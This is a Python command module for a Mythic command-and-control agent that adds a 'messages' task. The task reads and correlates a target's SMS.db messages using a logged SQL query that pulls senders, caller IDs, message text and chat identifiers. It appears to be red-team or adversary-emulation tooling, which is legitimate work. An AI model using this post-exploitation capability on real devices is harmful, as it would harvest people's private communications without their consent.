from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class MessagesArgs(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class MessagesCommand(CommandBase):
    cmd = "messages"
    needs_admin = False
    help_cmd = "messages"
    description = "Read and correlate messages from the SMS.db."
    version = 1
    author = "@brandon7CC"
    argument_class = MessagesArgs
    attackmapping = ["T1059"]

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        resp = await MythicRPC().execute("create_artifact", task_id=task.id,
                                         artifact="SELECT message.service, message.is_from_me, message.destination_caller_id, message.text, chat.chat_identifier, chat.guid AS chat_guid FROM message JOIN chat_handle_join ON message.handle_id = chat_handle_join.handle_id JOIN chat ON chat_handle_join.chat_id = chat.ROWID WHERE message.ck_record_id IS NOT NULL;",
                                         artifact_type="API Called",
                                         )
        return task

    async def process_response(self, response: AgentResponse):
        pass
